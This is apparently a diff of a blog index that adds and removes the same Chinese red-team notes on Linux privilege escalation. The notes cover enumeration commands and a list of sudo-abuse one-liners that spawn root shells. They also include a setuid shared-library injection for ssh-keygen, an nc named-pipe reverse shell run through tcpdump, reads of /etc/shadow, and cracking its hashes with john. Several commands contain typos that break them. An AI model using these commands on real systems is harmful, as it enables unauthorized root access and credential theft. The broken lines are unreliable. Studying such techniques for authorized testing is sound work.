+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p>Capabilities</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>ls相关(稍后别忘了查询补充)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -a </span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -liah</span><br></pre></td></tr></table></figure>
+<p>列出历史记录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">history</span><br></pre></td></tr></table></figure>
+<p>密码枚举</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+<p>查看有自动任务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>
+<p>查看路径</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $PATH</span><br></pre></td></tr></table></figure>
+<p>查看整体环境变量</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">env</span><br></pre></td></tr></table></figure>
+<p>查看进程(需要一定的研究)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps axjf</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps aux</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">top -n 1</span><br></pre></td></tr></table></figure>
+<p>网络统计</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -a</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -at   #tcp协议</span><br><span class="line">netstat -au   #udp协议</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -l    #列出所有监听端口</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -s    #用于统计网络使用</span><br></pre></td></tr></table></figure>
+<p>查看可执行文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>查看可利用工具（快速查找可执行文件）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">which [] 2&gt;/dev/null  #如python,ruby,awk等等,针对实际使用</span><br></pre></td></tr></table></figure>
+<p>检测可挂载的磁盘</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/fstab</span><br></pre></td></tr></table></figure>
+<h2 id="自动枚举">自动枚举</h2>
+<p>相关工具，仅列举</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/carlospolop/PEASS-ng</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/rebootuser/LinEnum</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/diego-treitos/linux-smart-enumeration</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/The-Z-Labs/linux-exploit-suggester</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/sleventyeleven/linuxprivchecker</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/pentestmonkey/unix-privesc-check</span><br></pre></td></tr></table></figure>
+<p>相关使用方法本文不赘述，后续新开文章。</p>
+]]></content>
+      <categories>
+        <category>红队笔记</category>
+      </categories>
+      <tags>
+        <tag>linux提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>linux提权之sudo其三</title>
+    <url>/2023/10/08/linux%E6%8F%90%E6%9D%83%EF%BC%882%EF%BC%89sudo%E5%85%B6%E4%B8%89/</url>
+    <content><![CDATA[<h1>Linux提权之sudo其三</h1>
+<h2 id="1-sudo-screen">1. sudo screen</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo  screen</span><br></pre></td></tr></table></figure>
+<h2 id="2-sudo-script">2. sudo script</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo script -q /dev/null</span><br><span class="line">#参数是为了将痕迹消除</span><br></pre></td></tr></table></figure>
+<h2 id="3-sudo-sed">3. sudo sed</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo sed -n &#x27;1e exec bash 1&gt;&amp;0&#x27; /etc/hosts</span><br></pre></td></tr></table></figure>
+<h2 id="4-sudo-service">4. sudo service</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo service ../../bin/bash   </span><br><span class="line">#控制路径</span><br></pre></td></tr></table></figure>
+<h2 id="5-sudo-socat">5. sudo socat</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo socat stdin exec:/bin/bash</span><br></pre></td></tr></table></figure>
+<h2 id="6-sudo-ssh">6. sudo ssh</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ssh -o ProxyCommand=&#x27;bash 0&lt;&amp;2 1&gt;&amp;2&#x27; x</span><br></pre></td></tr></table></figure>
+<p>提醒自己记得看配套文档深入理解</p>
+<h2 id="7-sudo-ssh-keygen-hard">7. sudo ssh-keygen - hard</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim []</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">static void inject()_atteibute_((constructor));</span><br><span class="line">void inject() &#123;</span><br><span class="line">        setuid(0);</span><br><span class="line">        system(&quot;/bin/bash -p&quot;);</span><br><span class="line">&#125;</span><br><span class="line">vim [].c</span><br><span class="line">gcc -shared -fPIC -o [].so [].c</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ssh-keygen -D ./[].so</span><br></pre></td></tr></table></figure>
+<p>不太理解</p>
+<h2 id="8-sudo-strace">8. sudo strace</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo strace -o /dev/null /bin/bash</span><br></pre></td></tr></table></figure>
+<h2 id="9-sudo-systemctl">9. sudo systemctl</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
+<h2 id="10-sudo-tcpdump-hard">10. sudo tcpdump - hard</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim [].sh  #创建脚本</span><br><span class="line">mknod [] p &amp;&amp; /bin/nc [] 0&lt;[] | /bin/bash 1&gt;[] </span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nc -lvnp []</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x [].sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z [脚本路径] -Z root</span><br></pre></td></tr></table></figure>
+<h2 id="11-sudo-tee">11. sudo tee</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -l -salt [] &#x27;123456&#x27; </span><br><span class="line">#生成密码哈希值</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | grep root</span><br><span class="line">查询替换相关参数</span><br></pre></td></tr></table></figure>
+<p>这一步稍后详细补充，其实大概思路还是进行替换或者是追加shadow，然后相当于得到已知密码</p>
+<h2 id="12-sudo-timedatectl">12. sudo timedatectl</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo timedatectl list-timezones </span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
+<h2 id="13-sudo-tmux">13. sudo tmux</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo tumx</span><br></pre></td></tr></table></figure>
+<h2 id="14-sudo-vi">14. sudo vi</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vi</span><br><span class="line">:!/bin/bash</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vi -c &#x27;:/bin/bash&#x27; /dev/null</span><br></pre></td></tr></table></figure>
+<h2 id="15-sudo-wall">15. sudo wall</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo wall --no /etc/shadow</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo john [上述存放报错信息的文件] --wordlist=/usr/share/wordlists/rockyou.txt[字典存放]  #使用john进行破解</span><br><span class="line">#使用john破解</span><br></pre></td></tr></table></figure>
+<h2 id="16-sudo-watch">16. sudo watch</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo watch -x bash -c &#x27;reset;exec bash 1&gt;&amp;0 2》&amp;0&#x27;</span><br></pre></td></tr></table></figure>
+<h2 id="17-sudo-wget2">17. sudo wget2</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[]=$(mktemp)</span><br><span class="line">chmod +x $[]</span><br><span class="line">echo -e &#x27;#!/bin/bash\n/bin/bash 1&gt;&amp;0&#x27; &gt;$[]</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo wegt --use-askpass=$[] 0</span><br></pre></td></tr></table></figure>
+<h2 id="18-sudo-zip">18. sudo zip</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo zip foo /etc/hosthome -T -TT &#x27;bash #&#x27;</span><br></pre></td></tr></table></figure>
+<h2 id="19-sudo-xxd">19. sudo xxd</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo xxd /etc/shadow</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo john [上述存放报错信息的文件] --wordlist=/usr/share/wordlists/rockyou.txt[字典存放]  #使用john进行破解</span><br><span class="line">#使用john破解</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>红队笔记</category>
+      </categories>
+      <tags>
+        <tag>linux提权</tag>
       </tags>
   </entry>
   <entry>
@@ -1778,264 +2036,6 @@ Linux下权限的粒度有 拥有者 、群组 、其它组 三种。每个文�
       </tags>
   </entry>
   <entry>
-    <title>Linux提权之原理与枚举</title>
-    <url>/2023/10/10/linux%E6%8F%90%E6%9D%83%EF%BC%881%EF%BC%89%E5%8E%9F%E7%90%86%E4%B8%8E%E6%9E%9A%E4%B8%BE/</url>
-    <content><![CDATA[<h1>Linux提权之原理与枚举</h1>
-<p>其实这才应该提权学习第一课，学习顺序有点小问题，qwq~~</p>
-<h2 id="提权简介">提权简介</h2>
-<p>提权，即提升权限，源自英语词汇Privilege Escalation，也可缩写为PrivEsca或PE。它是指在渗透测试或红队行动中，获得较低权限用户之后，提升至更高权限用户，直至获得root权限用户的过程。</p>
-<h2 id="提权原理">提权原理</h2>
-<h3 id="权限体系">权限体系</h3>
-<h4 id="UGORWX">UGORWX</h4>
-<h5 id="RWX">RWX</h5>
-<p>Linux中，每个文件拥有三种权限</p>
-<table>
-<thead>
-<tr>
-<th>权限</th>
-<th>对文件的影响</th>
-<th>对目录的影响</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>r (读取)</td>
-<td>可读取文件</td>
-<td>可列出目录内容</td>
-</tr>
-<tr>
-<td>w (写入)</td>
-<td>可修改文件内容</td>
-<td>可在目录中创建和删除文件</td>
-</tr>
-<tr>
-<td>x (执行)</td>
-<td>可执行文件（通常是可执行程序文件）；对于脚本文件，表示可以运行脚本</td>
-<td>可进入目录；必须拥有x权限，否则无法访问目录内容</td>
-</tr>
-</tbody>
-</table>
-<h5 id="UGO">UGO</h5>
-<p>Linux权限基于UGO模型进行控制</p>
-<ul>
-<li>U代表User, G代表Group, O代表other</li>
-<li>每一个文件的权限基于UGO进行设置</li>
-<li>权限三个一组(rwx), 对应UGO分别设置</li>
-<li>每个文件都有一个拥有者/用户(User), 用户的所属组即(Group), 不属于上面的都是other</li>
-</ul>
-<h5 id="修改方法">修改方法</h5>
-<p><strong>chmod</strong></p>
-<p>修改文件的权限,命令的模式如下: chmod 模式 文件</p>
-<h6 id="常规修改方式">常规修改方式</h6>
-<p>模式的格式如下</p>
-<ul>
-<li>u,g,o分别代表用户、组和其他</li>
-<li>a(all)代表全部(ugo)</li>
-<li>+,-,分别代表加入和删除对应权限</li>
-<li>r, w, x代表三种权限</li>
-</ul>
-<h6 id="模式示例">模式示例</h6>
-<table>
-<thead>
-<tr>
-<th>示例</th>
-<th>意义</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>chmod u+x test</td>
-<td>给所有者加执行权限</td>
-</tr>
-<tr>
-<td>chmod g+r test</td>
-<td>给所属组加读权限</td>
-</tr>
-<tr>
-<td>chmod a+w test</td>
-<td>给人加写权限</td>
-</tr>
-</tbody>
-</table>
-<h6 id="数字方式修改">数字方式修改</h6>
-<p>用数字4,2,1分别表示r,w,x权限</p>
-<p>使用数字表示权限时，每组权限分别对应数字之和，比如，rw=4+2=6,rwx=4+2+1=7</p>
-<p>要把文件test,权限改为rwxrwxr-x,命令为chmod 775 test</p>
-<h4 id="SUID-SGID">SUID  SGID</h4>
-<p>emmm。自己才接触，贴看的文章</p>
-<p><a href="https://www.cnblogs.com/sparkdev/p/9651622.html">Linux 特殊权限 SUID,SGID,SBIT </a></p>
-<h4 id="Capabilities">Capabilities</h4>
-<p><a href="https://www.cnblogs.com/sparkdev/p/11417781.html">Linux Capabilities </a></p>
-<h4 id="AppArmor-Selinux">AppArmor Selinux</h4>
-<p><a href="https://www.howtogeek.com/whats-new-in-ubuntu-2310/">What Is AppArmor, and How Does It Keep Ubuntu Secure?</a></p>
-<p><a href="https://linux.cn/article-7719-1.html">在 Linux 上用 SELinux 或 AppArmor 实现强制访问控制（MAC）</a></p>
-<p><a href="https://www.cnblogs.com/zhangrui153169/p/15349167.html">AppArmor与SELinux </a></p>
-<h4 id="ACL">ACL</h4>
-<p>暂空</p>
-<h4 id="安全机制">安全机制</h4>
-<ul>
-<li>Grsecurity</li>
-<li>Pax</li>
-<li>ExecShield</li>
-<li>ASLR</li>
-<li>TOMOYO Linux</li>
-<li>SMACk</li>
-<li>Yama</li>
-<li>CGroups</li>
-<li>Linux Namespaces</li>
-<li>Proplice</li>
-<li>Seccomp</li>
-<li>ptrace</li>
-<li>capsicum</li>
-<li>mprotect</li>
-<li>chroot</li>
-<li>firejail</li>
-</ul>
-<p>有点复杂，慢慢研究研究，需要专门新开一篇研究这个相关的</p>
-<h4 id="提权原理-2">提权原理</h4>
-<ol>
-<li>低权限可以修改可执行文件或者脚本，然后以高权限运行</li>
-<li>从用户行为的角度，低权限运维人员越需要记忆输入备份凭据</li>
-<li>绕过权限体系，在权限体系的上层捕捉拦截或者去修改凭据信息或者是权限的信息</li>
-</ol>
-<p><strong>提升交互性的命令</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stty raw -echo</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export TERM=xterm-color</span><br></pre></td></tr></table></figure>
-<h2 id="手动枚举">手动枚举</h2>
-<p>查看用户信息</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami  #当前身份</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id      #看当前用户的相关id</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">who     #当前登陆信息</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">w       #提供当前登陆用户的详细信息，做什么包括负载信息</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">last    #系统的登陆记录</span><br></pre></td></tr></table></figure>
-<p>查看内核</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -a        #查看基本信息</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsb_release -a  #内核信息更加详细</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/issue</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hostnamectl</span><br></pre></td></tr></table></figure>
-<p>看网卡及ip等信息</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip addr</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip route</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip neigh</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp -a    #局域网中有哪些mac地址和ip地址做了绑定</span><br></pre></td></tr></table></figure>
-<p>查看机器名称</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></table></figure>
-<p>查看可执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p>Capabilities</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<p>ls相关(稍后别忘了查询补充)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -a </span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -liah</span><br></pre></td></tr></table></figure>
-<p>列出历史记录</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">history</span><br></pre></td></tr></table></figure>
-<p>密码枚举</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
-<p>查看有自动任务</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>
-<p>查看路径</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $PATH</span><br></pre></td></tr></table></figure>
-<p>查看整体环境变量</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">env</span><br></pre></td></tr></table></figure>
-<p>查看进程(需要一定的研究)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps axjf</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps aux</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">top -n 1</span><br></pre></td></tr></table></figure>
-<p>网络统计</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -a</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -at   #tcp协议</span><br><span class="line">netstat -au   #udp协议</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -l    #列出所有监听端口</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -s    #用于统计网络使用</span><br></pre></td></tr></table></figure>
-<p>查看可执行文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<p>查看可利用工具（快速查找可执行文件）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">which [] 2&gt;/dev/null  #如python,ruby,awk等等,针对实际使用</span><br></pre></td></tr></table></figure>
-<p>检测可挂载的磁盘</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/fstab</span><br></pre></td></tr></table></figure>
-<h2 id="自动枚举">自动枚举</h2>
-<p>相关工具，仅列举</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/carlospolop/PEASS-ng</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/rebootuser/LinEnum</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/diego-treitos/linux-smart-enumeration</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/The-Z-Labs/linux-exploit-suggester</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/sleventyeleven/linuxprivchecker</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/pentestmonkey/unix-privesc-check</span><br></pre></td></tr></table></figure>
-<p>相关使用方法本文不赘述，后续新开文章。</p>
-]]></content>
-      <categories>
-        <category>红队笔记</category>
-      </categories>
-      <tags>
-        <tag>linux提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>linux提权之sudo其三</title>
-    <url>/2023/10/08/linux%E6%8F%90%E6%9D%83%EF%BC%882%EF%BC%89sudo%E5%85%B6%E4%B8%89/</url>
-    <content><![CDATA[<h1>Linux提权之sudo其三</h1>
-<h2 id="1-sudo-screen">1. sudo screen</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo  screen</span><br></pre></td></tr></table></figure>
-<h2 id="2-sudo-script">2. sudo script</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo script -q /dev/null</span><br><span class="line">#参数是为了将痕迹消除</span><br></pre></td></tr></table></figure>
-<h2 id="3-sudo-sed">3. sudo sed</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo sed -n &#x27;1e exec bash 1&gt;&amp;0&#x27; /etc/hosts</span><br></pre></td></tr></table></figure>
-<h2 id="4-sudo-service">4. sudo service</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo service ../../bin/bash   </span><br><span class="line">#控制路径</span><br></pre></td></tr></table></figure>
-<h2 id="5-sudo-socat">5. sudo socat</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo socat stdin exec:/bin/bash</span><br></pre></td></tr></table></figure>
-<h2 id="6-sudo-ssh">6. sudo ssh</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ssh -o ProxyCommand=&#x27;bash 0&lt;&amp;2 1&gt;&amp;2&#x27; x</span><br></pre></td></tr></table></figure>
-<p>提醒自己记得看配套文档深入理解</p>
-<h2 id="7-sudo-ssh-keygen-hard">7. sudo ssh-keygen - hard</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim []</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">static void inject()_atteibute_((constructor));</span><br><span class="line">void inject() &#123;</span><br><span class="line">        setuid(0);</span><br><span class="line">        system(&quot;/bin/bash -p&quot;);</span><br><span class="line">&#125;</span><br><span class="line">vim [].c</span><br><span class="line">gcc -shared -fPIC -o [].so [].c</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ssh-keygen -D ./[].so</span><br></pre></td></tr></table></figure>
-<p>不太理解</p>
-<h2 id="8-sudo-strace">8. sudo strace</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo strace -o /dev/null /bin/bash</span><br></pre></td></tr></table></figure>
-<h2 id="9-sudo-systemctl">9. sudo systemctl</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
-<h2 id="10-sudo-tcpdump-hard">10. sudo tcpdump - hard</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim [].sh  #创建脚本</span><br><span class="line">mknod [] p &amp;&amp; /bin/nc [] 0&lt;[] | /bin/bash 1&gt;[] </span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nc -lvnp []</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x [].sh</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z [脚本路径] -Z root</span><br></pre></td></tr></table></figure>
-<h2 id="11-sudo-tee">11. sudo tee</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -l -salt [] &#x27;123456&#x27; </span><br><span class="line">#生成密码哈希值</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | grep root</span><br><span class="line">查询替换相关参数</span><br></pre></td></tr></table></figure>
-<p>这一步稍后详细补充，其实大概思路还是进行替换或者是追加shadow，然后相当于得到已知密码</p>
-<h2 id="12-sudo-timedatectl">12. sudo timedatectl</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo timedatectl list-timezones </span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
-<h2 id="13-sudo-tmux">13. sudo tmux</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo tumx</span><br></pre></td></tr></table></figure>
-<h2 id="14-sudo-vi">14. sudo vi</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vi</span><br><span class="line">:!/bin/bash</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vi -c &#x27;:/bin/bash&#x27; /dev/null</span><br></pre></td></tr></table></figure>
-<h2 id="15-sudo-wall">15. sudo wall</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo wall --no /etc/shadow</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo john [上述存放报错信息的文件] --wordlist=/usr/share/wordlists/rockyou.txt[字典存放]  #使用john进行破解</span><br><span class="line">#使用john破解</span><br></pre></td></tr></table></figure>
-<h2 id="16-sudo-watch">16. sudo watch</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo watch -x bash -c &#x27;reset;exec bash 1&gt;&amp;0 2》&amp;0&#x27;</span><br></pre></td></tr></table></figure>
-<h2 id="17-sudo-wget2">17. sudo wget2</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[]=$(mktemp)</span><br><span class="line">chmod +x $[]</span><br><span class="line">echo -e &#x27;#!/bin/bash\n/bin/bash 1&gt;&amp;0&#x27; &gt;$[]</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo wegt --use-askpass=$[] 0</span><br></pre></td></tr></table></figure>
-<h2 id="18-sudo-zip">18. sudo zip</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo zip foo /etc/hosthome -T -TT &#x27;bash #&#x27;</span><br></pre></td></tr></table></figure>
-<h2 id="19-sudo-xxd">19. sudo xxd</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo xxd /etc/shadow</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo john [上述存放报错信息的文件] --wordlist=/usr/share/wordlists/rockyou.txt[字典存放]  #使用john进行破解</span><br><span class="line">#使用john破解</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>红队笔记</category>
-      </categories>
-      <tags>
-        <tag>linux提权</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>linux提权之sudo其二</title>
     <url>/2023/10/08/linux%E6%8F%90%E6%9D%83%EF%BC%882%EF%BC%89sudo%E5%85%B6%E4%BA%8C/</url>
     <content><![CDATA[<h1>linux提权之sudo其二</h1>
@@ -2099,63 +2099,6 @@ Linux下权限的粒度有 拥有者 、群组 、其它组 三种。每个文�
       </categories>
       <tags>
         <tag>linux提权</tag>
-      </tags>
-  </entry>
